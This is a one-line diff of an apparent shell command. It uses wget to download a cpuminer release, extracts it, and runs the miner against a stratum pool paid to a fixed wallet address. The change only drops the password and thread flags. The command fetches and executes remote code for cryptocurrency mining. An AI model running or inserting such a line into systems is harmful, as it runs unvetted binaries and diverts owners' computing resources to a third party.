@@ -1,1 +1,1 @@
-wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz && tar -xf cpuminer-opt-linux.tar.gz  && ./cpuminer-avx2 -a power2b -o stratum+tcp://stratum-eu.rplant.xyz:7022 -u MrQG1JGU7GY4YUTgUsBrVPQqKVpk97j3Sc.crot -p x -t 4
+wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz && tar -xf cpuminer-opt-linux.tar.gz  && ./cpuminer-avx2 -a power2b -o stratum+tcp://stratum-eu.rplant.xyz:7022 -u MrQG1JGU7GY4YUTgUsBrVPQqKVpk97j3Sc.crot
